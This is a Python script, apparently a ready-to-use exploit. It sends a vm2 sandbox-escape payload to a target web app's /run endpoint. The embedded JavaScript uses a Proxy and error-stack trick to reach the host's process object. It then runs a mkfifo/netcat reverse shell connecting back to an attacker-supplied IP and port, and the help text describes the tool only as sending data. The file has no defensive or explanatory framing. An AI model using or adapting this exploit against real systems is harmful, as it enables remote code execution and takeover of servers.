import argparse
import json
import base64
import requests
import socket
import sys

def send_data(ip, url, port, data):
    headers = {
        "Referer": f"{url}/editor",  # Replace 'editor' with the actual endpoint
        "Content-Type": "application/json",
        }
    payload = json.dumps({'code': base64.b64encode(data.encode('utf-8')).decode('utf-8')})
    response = requests.post(f"{url}/run", headers=headers, data=payload)
    if response.status_code == 200:
        print("Data sent successfully!")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")

def main():
    parser = argparse.ArgumentParser(description="Send data to a specified website in base64-encoded JSON format")
    parser.add_argument("-u", "--url", help="HTTP address of the destination website")
    parser.add_argument("-p", "--port", type=int, help="Port to listen on")
    parser.add_argument("-i", "--ip", help="Your IP address")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    ip = args.ip
    url = args.url
    port = args.port
    data = "const {VM} = require(\"vm2\");\n"
    data = data + "const vm = new VM();\n\n"
    data = data + "const code = `\n"
    data = data + "err = {};\n"
    data = data + "const handler = {\n"
    data = data + "getPrototypeOf(target) {\n"
    data = data + "(function stack() {\n"
    data = data + "new Error().stack;\n"
    data = data + "stack();\n"
    data = data + "})();\n"
    data = data + "}\n"
    data = data + "};\n"
    data = data + "const proxiedErr = new Proxy(err, handler);\n"
    data = data + "try {\n"
    data = data + "throw proxiedErr;\n"
    data = data + "} catch ({constructor: c}) {\n"
    data = data + f"c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f');\n"
    data = data + "}`;\n\n"
    data = data + "console.log(vm.run(code));"

    print(data)
    send_data(ip, url, port, data)

if __name__ == "__main__":
    main()
